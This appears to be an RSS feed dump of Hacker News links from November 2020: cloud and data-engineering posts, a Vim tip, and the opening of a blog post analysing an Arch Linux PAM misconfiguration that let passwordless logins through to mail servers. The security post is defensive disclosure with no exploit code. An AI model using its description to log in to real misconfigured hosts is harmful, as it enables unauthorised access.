<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://blog.imagico.de/the-osmf-changes-during-the-past-year-and-what-they-mean-for-the-coming-years-part-2/">http://blog.imagico.de/the-osmf-changes-during-the-past-year-and-what-they-mean-for-the-coming-years-part-2/</a></em></p>]]>
            </description>
            <link>http://blog.imagico.de/the-osmf-changes-during-the-past-year-and-what-they-mean-for-the-coming-years-part-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203902</guid>
            <pubDate>Tue, 24 Nov 2020 22:46:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I made a Loom competitor available directly from a webpage (nothing to install)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203842">thread link</a>) | @Maxmanseau
<br/>
November 24, 2020 | https://hellozest.io/f#/fire | <a href="https://web.archive.org/web/*/https://hellozest.io/f#/fire">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://hellozest.io/f#/fire</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203842</guid>
            <pubDate>Tue, 24 Nov 2020 22:39:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BIT joins OpenNebula's Managed Service Provider (MSP) Program]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203765">thread link</a>) | @amarti
<br/>
November 24, 2020 | https://opennebula.io/bit-joins-opennebula-msp-program/ | <a href="https://web.archive.org/web/*/https://opennebula.io/bit-joins-opennebula-msp-program/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			    <!-- .entry-header -->

				
					
<article id="post-28713">

    <!-- .entry-header -->

    <div>

		
<p>Managed Service Providers are out to meet the needs of many organizations, and Managed Private Clouds offer a suitable alternative for those looking to reap the benefits of a private cloud environment without the hassle of managing and administering it on their own. And <a href="https://opennebula.io/opennebula-managed-service-provider-partnership/">OpenNebula announced</a> that it is opening the doors to its Solution Provider Partner Program, making way for qualified MSP’s. Our <a href="https://support.opennebula.pro/hc/en-us/articles/115005959343-Solution-Provider-Partner-Program-Guide">Partner Program</a> makes it easy for MSP’s not only to offer private clouds to their customers that are backed by official OpenNebula Systems support, but also having the security and comfort to deploy these clouds with the OpenNebula Enterprise Edition.&nbsp;</p>



<p><a href="https://www.bit.nl/opennebula" target="_blank" rel="noreferrer noopener">BIT</a> has been a long time user of OpenNebula, as well as an avid contributor to its development and evolution over the years. Now, they have joined our Partner Program as an official OpenNebula MSP, offering a comprehensive private cloud service to their customers that reaps the benefits of an OpenNebula subscription and the official backing and support of the OpenNebula Systems team.</p>







<blockquote><p>“<em><em>With OpenNebula’s feature-rich and stable software, along with its extensibility, flexibility, and integration of third-party tools, we have a platform and a partner which allows us to create a dependable platform for BIT and our customers.</em></em>”&nbsp;</p><cite>– Stefan Kooman, System Administrator, BIT</cite></blockquote>







<p>If you are an MSP using OpenNebula, and you would like to ensure that you are equipped to offer the best managed private cloud and support to your customers, reach out to our <a href="mailto:partners@opennebula.io">Partners Manager</a>, and inquire about how you can partner with us as an OpenNebula MSP Solution Provider Partner.&nbsp;&nbsp;</p>
		
		


        <div>
            <p><img alt="" src="https://secure.gravatar.com/avatar/a1737e9efc6920480d8a1abc8d21fd64?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/a1737e9efc6920480d8a1abc8d21fd64?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96">            </p>
            <div>
                <p><span id="autorblog">Michael Abdou</span></p><p>Customer Success Manager at OpenNebula</p>
            </div>
        </div>
	</div><!-- .entry-content -->

</article><!-- #post-## -->

					
<!-- #comments -->

				
			</div></div>]]>
            </description>
            <link>https://opennebula.io/bit-joins-opennebula-msp-program/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203765</guid>
            <pubDate>Tue, 24 Nov 2020 22:30:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Identity and Access Management with Google Cloud]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203692">thread link</a>) | @adrianancona
<br/>
November 24, 2020 | https://ncona.com/2020/11/identity-and-access-management-with-google-cloud/ | <a href="https://web.archive.org/web/*/https://ncona.com/2020/11/identity-and-access-management-with-google-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In this post we’re going to learn how to use Google Cloud IAM (Identity and Access Management) to limit who can manage resources in a Google Cloud account.</p>

<p>If you are interested in AWS IAM, you can check my <a href="https://ncona.com/2020/04/identity-and-access-management-with-aws-iam/">Identity and Access Management with AWS</a> article.</p>

<h2 id="concepts">Concepts</h2>

<ul>
  <li><strong>Member</strong> - An entity that needs to perform an action on a resource. An end user or a service are examples of members</li>
  <li><strong>Identity</strong> - Another name for <strong>Member</strong></li>
  <li><strong>Resource</strong> - A resource is pretty much anything that can be managed in GCP. A compute engine instance or a cloud storage bucket are examples of resources</li>
  <li><strong>Permission</strong> - Allows or denys access to resources. For example: create a storage bucket</li>
  <li><strong>Role</strong> - A collection of permissions. Roles can be granted to <strong>members</strong></li>
  <li><strong>Policy</strong> - Defines who (<strong>member</strong>) can perform which actions (<strong>permissions</strong>) on which <strong>resources</strong></li>
</ul>

<!--more-->

<h2 id="owner">Owner</h2>

<p>When we create a new project, there will be a single <code>Member</code> with the <code>Owner</code> role assigned to it:</p>

<p><a href="https://ncona.com/images/posts/gcp-iam-owner.png"><img src="https://ncona.com/images/posts/gcp-iam-owner.png" alt="GCP IAM owner"></a></p>

<p>This is the person that created the Google Cloud account and has complete domain over it. A project must have at least one owner.</p>

<h2 id="service-accounts">Service accounts</h2>

<p>Service accounts are a way to allow software to do things in Google Cloud. Some examples of software that wants to do something in Google Cloud are:</p>

<ul>
  <li><a href="https://ncona.com/2020/09/introduction-to-google-cloud-cli/">Google Cloud CLI</a></li>
  <li>A build system that publishes docker images to container registry</li>
  <li>A program that stores photos in storage buckets</li>
</ul>

<p>Depending on what the software needs to do, we should assign a role with only the necessary permissions to do what it needs.</p>

<p>Service accounts are created from the <a href="https://console.cloud.google.com/identity/serviceaccounts">Identity -&gt; Service Accounts section</a> on the cloud console.</p>

<p>Since we’re going to be using <code>gcloud</code> for the rest of the article, take a look at my <a href="https://ncona.com/2020/09/introduction-to-google-cloud-cli/">introduction to Google Cloud CLI</a> for how to configure it. Notice that this role is all powerful, so it should be only used by the owner of the account.</p>

<p>Once we have <code>gcloud</code> configured, we can see all the service accounts:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>gcloud iam service-accounts list
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To create a new service account:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>gcloud iam service-accounts create &lt;NAME&gt; <span>\</span>
    <span>--description</span><span>=</span><span>"&lt;DESCRIPTION&gt;"</span> <span>\</span>
    <span>--display-name</span><span>=</span><span>"&lt;NAME&gt;"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To delete a service account:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>gcloud iam service-accounts delete &lt;SERVICE ACCOUNT&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="members">Members</h2>

<p>Gcloud’s interface is not the prettiest, so if we want to get information about the members we have to use this command:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>gcloud projects get-iam-policy &lt;PROJECT&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The output will show all members (including service accounts) and all the roles associated with them.</p>

<p>In the previous section we saw how to add service accounts. Other types of members are:</p>

<ul>
  <li>Google account</li>
  <li>Google group</li>
  <li>Google Workspace</li>
  <li>Cloud Identity</li>
</ul>

<p>I’m not going to explain these in detail.</p>

<p>A Google account is any account that was opened on Google (e.g. myname@gmail.com). We can add a google account as a member of our project using this command:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>gcloud projects add-iam-policy-binding &lt;PROJECT&gt; <span>\</span>
    <span>--member</span><span>=</span>user:&lt;USER EMAIL&gt; <span>\</span>
    <span>--role</span><span>=</span>&lt;ROLE&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I’ll talk more about the possible values for <code>ROLE</code> later in this article</p>

<h2 id="roles">Roles</h2>

<p>Roles are a way to group permissions so they can easily be assigned to members. There are a lot of roles provided by default by Google (e.g. Editor), but it’s better to create our own roles so we grant the least amount of permissions to each member.</p>

<p>We can see all the roles in our project with:</p>



<p>This command shows the roles’ names and descriptions, but it doesn’t show which permissions are assigned to the role. To see the permissions assigned to a role, we can use:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>gcloud iam roles describe &lt;ROLE&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>For example:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td><pre><span>$ </span>gcloud iam roles describe roles/workflows.viewer
description: Read-only access to workflows and related resources.
etag: <span>AA</span><span>==</span>
includedPermissions:
- resourcemanager.projects.get
- resourcemanager.projects.list
- workflows.executions.get
- workflows.executions.list
- workflows.locations.get
- workflows.locations.list
- workflows.operations.get
- workflows.operations.list
- workflows.workflows.get
- workflows.workflows.getIamPolicy
- workflows.workflows.list
name: roles/workflows.viewer
stage: BETA
title: Workflows Viewer
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Getting the list of all the permissions that exist (and can be assigned to a role) is not easy. The best way I know to find which permissions I need to assign to a role is by asking google. There is a <a href="https://cloud.google.com/iam/docs/permissions-reference">permissions reference</a>, but it’s pretty hard to navigate.</p>

<p>We can create our own role with this command:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>gcloud iam roles create &lt;ROLE ID&gt; <span>\</span>
    <span>--project</span><span>=</span><span>"&lt;PROJECT&gt;"</span> <span>\</span>
    <span>--description</span><span>=</span><span>"&lt;DESCRIPTION&gt;"</span> <span>\</span>
    <span>--permissions</span><span>=</span><span>"&lt;PERMISSIONS&gt;"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>For example:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>gcloud iam roles create MyTestRole <span>\</span>
    <span>--project</span><span>=</span>golden-frame-295509 <span>\</span>
    <span>--description</span><span>=</span><span>"Created this role because I wanted to"</span> <span>\</span>
    <span>--permissions</span><span>=</span><span>"workflows.operations.list,workflows.operations.get"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can modify a role we created. To remove permissions:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>gcloud iam roles create &lt;ROLE ID&gt; <span>\</span>
    <span>--project</span><span>=</span><span>"&lt;PROJECT&gt;"</span> <span>\</span>
    <span>--description</span><span>=</span><span>"&lt;DESCRIPTION&gt;"</span> <span>\</span>
    <span>--remove-permissions</span><span>=</span><span>"&lt;PERMISSIONS&gt;"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To add permisions:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>gcloud iam roles create &lt;ROLE ID&gt; <span>\</span>
    <span>--project</span><span>=</span><span>"&lt;PROJECT&gt;"</span> <span>\</span>
    <span>--description</span><span>=</span><span>"&lt;DESCRIPTION&gt;"</span> <span>\</span>
    <span>--add-permissions</span><span>=</span><span>"&lt;PERMISSIONS&gt;"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now that we know how to create <code>members</code> and <code>roles</code>, we can learn how to manage them.</p>

<p>We add a <code>role</code> to a service account by attaching a policy binding:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>gcloud projects add-iam-policy-binding &lt;PROJECT&gt; <span>\</span>
    <span>--member</span> serviceAccount:&lt;SERVICE ACCOUNT&gt; <span>\</span>
    <span>--role</span> &lt;ROLE&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To remove a role:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>gcloud projects remove-iam-policy-binding &lt;PROJECT&gt; <span>\</span>
    <span>--member</span> serviceAccount:&lt;SERVICE ACCOUNT&gt; <span>\</span>
    <span>--role</span> &lt;ROLE&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To see all the roles assigned to a member:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>gcloud projects get-iam-policy &lt;PROJECT&gt;  <span>\</span>
    <span>--flatten</span><span>=</span><span>"bindings[].members"</span> <span>\</span>
    <span>--format</span><span>=</span><span>'table(bindings.role)'</span> <span>\</span>
    <span>--filter</span><span>=</span><span>"bindings.members:&lt;SERVICE ACCOUNT&gt;"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now we have all we need to create members and attach the correct roles to those members.</p>

<h2 id="conclusion">Conclusion</h2>

<p>I’m not and expert in Identity and Access Management, but I was surprised by how hard it was to get the commands right with gcloud. The way <code>gcloud</code> commands are organized makes it really difficult to use the help to discover how to achieve something. I had to do multiple Google searches to find how to do some things.</p>

<p>The concepts of organization and project can also be tricky. In all the examples above, we created resources at the project level, but it’s also possible to create resources at the organization level, which might make navigation confusing.</p>

  </div></div>]]>
            </description>
            <link>https://ncona.com/2020/11/identity-and-access-management-with-google-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203692</guid>
            <pubDate>Tue, 24 Nov 2020 22:23:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vim Sessions]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203660">thread link</a>) | @RMPR
<br/>
November 24, 2020 | https://rmpr.xyz/Vim-Session/ | <a href="https://web.archive.org/web/*/https://rmpr.xyz/Vim-Session/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Even though I prefer to use one buffer at a time to be more focused. I sometimes needed to have multiple buffers 
open in splits (Terminal, Netrw, …). And when for whatever reason, I needed to close them or shutdown my computer. I didn’t like loosing my context. Enter Vim sessions.</p>

<p>They are quite simple, if you want to save your layout as it is, just type <code>:mksession</code>  or for short <code>:mks</code> 
(yay! 6 strokes saved) and a file named Session.vim will be created. All you have to do the next time you open 
your project folder is <code>vim -S</code>.</p>

<p>P.S.</p>
<ul>
  <li>If there’s already a session file you will need to append ! at the end of the command to overwrite</li>
  <li>You can eventually specify the session filename, for more info <code>:help :mks</code></li>
</ul>

<p>In almost one year of Vim usage, I always wanted to do this, but somehow tutorials address mostly plugins installation and usage. No, I want the real, rough Vim, please.</p>

<p><a href="https://www.youtube.com/watch?v=jPPozzOCyIw"><img src="https://rmpr.xyz/images/sessions.gif" alt="Vim sessions"></a></p>


  </div></div>]]>
            </description>
            <link>https://rmpr.xyz/Vim-Session/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203660</guid>
            <pubDate>Tue, 24 Nov 2020 22:19:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Build a Production Grade Workflow with SQL Modelling]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203365">thread link</a>) | @oedmarap
<br/>
November 24, 2020 | https://shopify.engineering/build-production-grade-workflow-sql-modelling | <a href="https://web.archive.org/web/*/https://shopify.engineering/build-production-grade-workflow-sql-modelling">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p><strong>By Michelle Ark and Chris Wu</strong></p>
<p>In January of 2014, Shopify built a data pipeline platform for the data science team called Starscream. Back then, we were a smaller team and needed a tool that could deal with everything from ad hoc explorations to machine learning models. We chose to build with PySpark to get the power of a generalized distributed computer platform, the backing of the industry standard, and the ability to tap into the Python talent market.&nbsp;</p>
<p>Fast forward six years and our data needs have changed. Starscream now runs 76,000 jobs and writes 300 terabytes a day! As we grew, some types of work went away, but others (like simple reports) became so commonplace we do them every day. While our Python tool based on PySpark was computationally powerful, it wasn’t optimized for these commonplace tasks. If a product manager needed a simple rollup for a new feature by country, pulling it, and modeling it wasn’t a fast task.</p>
<p>We’ll show you how we moved to a SQL modelling workflow by leveraging <a href="https://www.getdbt.com/" target="_blank" title="Analytics engineering is the data transformation work that happens between loading data into your warehouse and analyzing it. dbt allows anyone comfortable with SQL to own that workflow." rel="nofollow noopener noreferrer">dbt</a> (data build tool) and created tooling for testing and documentation on top of it. All together, these features provide Shopify’s data scientists with a robust, production-ready workflow to quickly build straightforward pipelines.</p>

<p>When we interviewed our users to understand their workflow on Starscream, there were two issues we discovered: <em>development time</em> and <em>thinking</em>.</p>
<p><em>Development time</em> encompasses the time data scientists use to prototype the data model they’d like to build, run it, see the outcome,and iterate. The PySpark platform isn’t ideal for running straightforward reporting tasks, often forcing data scientists to write boilerplate and it yields long runtimes. This led to long iteration cycles when trying to build models on unfamiliar data.</p>
<p>The second issue, <em>thinking</em>, is more subtle and deals with the way the programming language forces you to look at the data. Many of our data scientists prefer SQL to python because its structure forces consistency in business metrics. When interviewing users, we found a majority would write out a query in SQL then translate it to Python when prototyping. Unfortunately, query translation is time consuming and doesn’t add value to the pipeline.</p>
<p>To understand how widespread these problems were, we audited the jobs run and surveyed our data science team for the use cases. We found that 70% or so of the PySpark jobs on Starscream were full batch queries that didn’t require generalized computing. We viewed this as an opportunity to make a kickass optimization for a painful workflow.&nbsp;</p>

<p>Our goal was to create a SQL pipeline for reporting that enables data scientists to create simple reporting data faster, while still being production ready. After exploring a few alternatives, we felt that the dbt library came closest to our needs. Their tagline “deploy analytics code faster with software engineering practices” was <em>exactly</em> what we were looking for in a workflow. We opted to pair it with Google BigQuery as our data store and dubbed the system and its tools, Seamster.</p>
<p>We knew that any off-the-shelf system wouldn’t be one size fits all. In moving to dbt, we had to implement our own:</p>
<ul>
<li>source and model structure to modularize data model development</li>
<li>unit testing to increase the types of testable errors</li>
<li>continuous integration (CI) pipelines to provide safety and consistency guarantees.</li>
</ul>
<h2>Source Independence and Safety</h2>
<p>With dozens of data scientists making data models in a shared repository, a great user experience would</p>
<ul>
<li>maximize focus on work&nbsp;</li>
<li>minimize the impact of model changes by other data scientists.</li>
</ul>
<p>By default, dbt declares raw sources in a central <code>sources.yml</code>. This quickly became a very large file as it included the schema for each source, in addition to the source name. It creates a huge bottleneck for teams editing the same file across multiple PRs.&nbsp;</p>

<p>To mitigate the bottleneck, we leveraged the flexibility of dbt and created a top-level ‘sources’ directory to represent each raw source with its own source-formatted yaml file. This way, data scientists can parse only the source documentation that’s relevant for them and contribute to the <code>sources.yml</code> file without stepping on each other’s toes.</p>

<p><em>Base models are one-to-one interfaces to raw sources.</em></p>
<p>We also created a Base layer of models using the <a href="https://discourse.getdbt.com/t/how-we-structure-our-dbt-projects/355" target="_blank" rel="nofollow noopener noreferrer">‘</a><a href="https://discourse.getdbt.com/t/how-we-structure-our-dbt-projects/355" target="_blank" title="How we structure our dbt projects" rel="nofollow noopener noreferrer">staging’ concept from dbt</a> to implement their best practice of <a href="https://docs.getdbt.com/docs/guides/best-practices/#limit-references-to-raw-data" target="_blank" title="Limit references to raw data - dbt" rel="nofollow noopener noreferrer">limiting references to raw data</a>. Our Base models serve as a one-to-one interface to raw sources. They don’t change the grain of the raw source, but do apply renaming, recasting, or any other cleaning operation that relates to the source data collection system.&nbsp;</p>
<p>The Base layer serves to protect users from breaking changes in raw sources. Raw external sources are by definition out of the control of Seamster and can introduce breaking changes for any number of reasons at any point in time. If and when this happens, you only need to apply the fix to the Base model representing the raw source, as opposed to every individual downstream model that depends on the raw source.&nbsp;</p>
<h2>Model Ownership for Teams</h2>
<p>We knew that the tooling improvements of Seamster would be only one part of a greater data platform at Shopify. We wanted to make sure we’re providing mechanisms to support good dimensional modelling practices and support data discovery.</p>
<p>In dbt, a model is simply a .sql file. We’ve extended this definition in Seamster to define a model as a directory consisting of four files:&nbsp;</p>
<ul>
<li><code>model_name.sql</code></li>
<li><code>schema.yml</code></li>
<li><code>README.md</code></li>
<li><code>test_model_name.py</code></li>
</ul>
<p>You can further organize models into directories that indicate a data science team at Shopify like ‘finance’ or ‘marketing’.&nbsp;</p>
<p>To support a clean data warehouse we’ve also organized data models into these rough layers that differentiate between:</p>
<ul>
<li>
<strong>base</strong>: data models that are one-to-one with raw data, but cleaned, recast and renamed</li>
<li>
<strong>application-ready</strong>: data that isn’t dimensionally modelled but still transformed and clean for consumption by another tool (for example,&nbsp; training data for a machine learning algorithm)</li>
<li>
<strong>presentation</strong>: shareable and reliable data models that follow dimensional modelling best practices and can be used by data scientists across different domains.</li>
</ul>
<p>With these two changes, a data consumer can quickly understand the data quality they can expect from a model and find the owner in case there is an issue. We also pass this metadata upstream to <a href="https://shopify.engineering/solving-data-discovery-challenges-shopify" target="_blank" title="How We’re Solving Data Discovery Challenges at Shopify" rel="nofollow noopener noreferrer">other tools</a> to help with the data discovery workflow.</p>
<h2>More Tests</h2>
<p>dbt has native support for ‘schema tests’, which are encoded in a model’s schema.yml file. These tests run against production data to validate data invariants, such as the presence of null values or the uniqueness of a particular key. This feature in dbt serves its purpose well, but we also want to enable data scientists to write unit tests for models that run against fixed input data (as opposed to production data).</p>
<p>Testing on fixed inputs allows the user to test edge cases that may not be in production yet. In larger organizations, there can and will be frequent updates and many collaborators for a single model. Unit tests give users confidence that the changes they’re making won’t break existing behaviour or introduce regressions.&nbsp;</p>
<p>Seamster provides a Python-based unit testing framework. Data scientists write their unit tests in the <code>test_model_name.py</code> file in the model directory. The framework enables constructing ‘mock’ input models from fixed data. The central object in this framework is a ‘mock’ data model, which has an underlying representation of a Pandas dataframe. You can pass fixed data to the mock constructor as either a csv-style string, Pandas dataframe, or a list of dictionaries to specify input data.&nbsp;</p>
<p><img alt="Input and expected MockModels are built from static data. The actual MockModel is built from input MockModels by BigQuery. Actual and expected MockModels can assert equality or any Great Expectations expectation" data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/input-expected-mock-models.jpg?v=1605811967" src="https://cdn.shopify.com/s/files/1/0779/4361/files/input-expected-mock-models.jpg?v=1605811967"><br><em>Input and expected MockModels are built from static data. The actual MockModel is built from input MockModels by BigQuery. Actual and expected MockModels can assert equality or any Great Expectations expectation.</em></p>
<p>A constructor creates a test query where a common table expression (CTE) represents each input mock data model, and any references to production models (identified using dbt’s ‘ref’ macro) are replaced by references to the corresponding CTE. Once you execute a query, you can compare the output to an expected result. In addition to an equality assertion, we extended our framework to support all expectations from the open-source <a href="https://github.com/great-expectations/great_expectations" target="_blank" title="Great Expectations - Always know what to expect from your data." rel="nofollow noopener noreferrer">Great Expectations</a> library to provide more granular assertions and error messaging.&nbsp;</p>
<p>The main downside to this framework is that it requires a roundtrip to the query engine to construct the test data model given a set of inputs. Even though the query itself is lightweight and processes only a handful of rows, these roundtrips to the engine add up. It becomes costly to run an entire test suite on each local or CI run. To solve this, we introduced tooling both in development and CI to run the minimal set of tests that could potentially break given the change. This was straightforward to implement with accuracy because of dbt’s lineage tracking support; we simply had to find all downstream models (direct and indirect) for each changed model and run their tests.&nbsp;</p>
<h2>Schema and Directed Acyclic Graph Validation on the Cheap</h2>
<p>Our objective in Seamster’s CI is to give data scientists peace of mind that their changes won’t introduce production errors the next time the warehouse is built. They shouldn’t have to wonder whether removing a column will cause downstream dependencies to break, or whether they made a small typo in their SQL model definition.</p>
<p>To achieve this accurately, we would need to build and tear down the entire warehouse on every commit. This isn’t feasible from both a time and cost perspective. Instead, on every commit we materialize every model as a view in a temporary BigQuery dataset which is created at the start of the validation process and removed as soon as the validation finishes. If we can’t build a view because its upstream model doesn’t provide a certain column, or if the SQL is invalid for any reason, BigQuery fails to build the view and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shopify.engineering/build-production-grade-workflow-sql-modelling">https://shopify.engineering/build-production-grade-workflow-sql-modelling</a></em></p>]]>
            </description>
            <link>https://shopify.engineering/build-production-grade-workflow-sql-modelling</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203365</guid>
            <pubDate>Tue, 24 Nov 2020 21:52:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Conducto – Use Python to write, run, view and debug DevOps pipelines]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25203326">thread link</a>) | @jonsolo
<br/>
November 24, 2020 | https://www.conducto.com/app/sandbox/github/conducto/examples?dir=cicd%2Fflask_microservice&preview_file=pipeline.py | <a href="https://web.archive.org/web/*/https://www.conducto.com/app/sandbox/github/conducto/examples?dir=cicd%2Fflask_microservice&preview_file=pipeline.py">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.conducto.com/app/sandbox/github/conducto/examples?dir=cicd%2Fflask_microservice&amp;preview_file=pipeline.py</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203326</guid>
            <pubDate>Tue, 24 Nov 2020 21:48:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pam Bypass: when null(is not)ok]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203265">thread link</a>) | @Foxboron
<br/>
November 24, 2020 | https://linderud.dev/blog/pam-bypass-when-nullis-notok/ | <a href="https://web.archive.org/web/*/https://linderud.dev/blog/pam-bypass-when-nullis-notok/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <h2 id="the-problem">The Problem</h2>
<p>Someone enters an IRC support channel and proclaims their dovecot server has
been hacked and a non existing user sends spam email from their server. The
initial reaction might be something along the lines of</p>
<p><strong>Wat ಠ_ಠ</strong></p>
<p>With the following assumption that the user <em>clearly</em> did something wrong.
Hosting email is difficult after all. I don’t quite recall how rest of the
support went, but it was solved and the root cause was not found. However, we
keep on rolling! Then someone posts about a similar incident on <a href="https://www.reddit.com/r/archlinux/comments/jvh38a/postfix_dovecot_got_hacked/">r/archlinux</a>.</p>
<p>Now, if this happens twice something is amiss! Arch has had a few issues with
PAM lately, thus it could be that there is a configuration issue.  Johannes and
I try to reproduce, but I don’t get far and Johannes keeps on working on the
issue.</p>
<h2 id="the-setup">The Setup</h2>
<p>The first thing you notice looking into the <a href="https://github.com/archlinux/svntogit-packages/blob/packages/pambase/trunk/system-auth"><code>/etc/pamd.d/system-auth</code></a>
of Arch Linux is the following lines:</p>
<pre><code data-lang="pam">auth  [success=2 default=ignore]  pam_unix.so   try_first_pass nullok
							       ^^^^^^</code></pre>
<p>This allows a user with a blank password to go forward with the PAM
authentication. As the <a href="https://linux.die.net/man/8/pam_unix">manpage</a> explains;</p>
<blockquote>
<p>The default action of this module is to not permit the user access to a service if their official password is blank. The <strong>nullok</strong> argument overrides this default.</p>
</blockquote>
<p>The second relevant line is the inclusion of <a href="https://linux.die.net/man/8/pam_permit">pam_permit.so</a> which indiscriminately
allows anyone reaching this far access to the system. Clearly a must have for
any well functioning system regardless of being “very dangerous” and “used with
extreme caution” 🙄.</p>
<p>Now, keep all of this in mind as we continue.</p>
<p>The first hint towards the culprit of the issue is when the author of the reddit
posts submits an email to <a href="mailto:security@archlinux.org">security@archlinux.org</a>:</p>
<blockquote>
<p>Back in May 2020 there was a change to root account in shadow file such that root with no password was no longer supported.</p>
<p>During patching this created a file /etc/shadow.pacnew</p>
<p>If that pacnew was not merged to the shadow file this will result in pam allowing any invalid account to successfully auth with no password.</p>
<p>The problem is that if the * is missing from the root line in the shadow file then the most recent pam system-auth config will allow auth bypass.</p>
<p>This impacted me when my mail server (dovecot/postfix) got breached via a “no password” and sent significant spam.</p>
</blockquote>
<p>The change which is mentioned is the following change to the <code>filesystem</code>
package in the file <a href="https://github.com/archlinux/svntogit-packages/commit/0320c909f3867d47576083e853543bab1705185b#diff-3e341d2d9c67be01819b25b25d5e53ea3cdf3a38d28846cda85a195eb9b7203a"><code>/etc/shadow</code></a></p>
<div><pre><code data-lang="diff"><span>-root::14871::::::
</span><span></span><span>+root:*:14871::::::
</span></code></pre></div>
<p>This is something most shadow configurations in Linux distributions carry these
days. Through a bit of oversight the root account of any Arch installation has
no root password set, thus you need to set one yourself or else you can swap tty
and log into the root user. Now this hole was fixed.</p>
<p>Since this file was changed <code>pacman</code> is going to see that the local file has
modification (you probably have more users on your system!) and stuff this
change into <code>/etc/shadow.pacnew</code> as noted in the <a href="https://www.archlinux.org/pacman/pacman.8.html#_handling_config_files_a_id_hcf_a">manpage</a>.  This is also part of the <code>pacman</code> output, but I guess you can see how it’s easy
to miss when you run a server with a few hundred packages to update.</p>
<div><pre><code data-lang="text">[root@archlinux ~]# pacman -S filesystem
resolving dependencies...
looking for conflicting packages...

Packages (1) filesystem-2020.09.03-1

Total Installed Size:   0.03 MiB
Net Upgrade Size:      -0.01 MiB

:: Proceed with installation? [Y/n] 
(1/1) checking keys in keyring                         [###############] 100%
(1/1) checking package integrity                       [###############] 100%
(1/1) loading package files                            [###############] 100%
(1/1) checking for file conflicts                      [###############] 100%
(1/1) checking available disk space                    [###############] 100%
:: Processing package changes.
(1/1) upgrading filesystem                             [###############] 100%
warning: /etc/shadow installed as /etc/shadow.pacnew
:: Running post-transaction hooks...
(1/4) Creating system user accounts...
(2/4) Applying kernel sysctl settings...
(3/4) Creating temporary files...
(4/4) Arming ConditionNeedsUpdate...</code></pre></div>
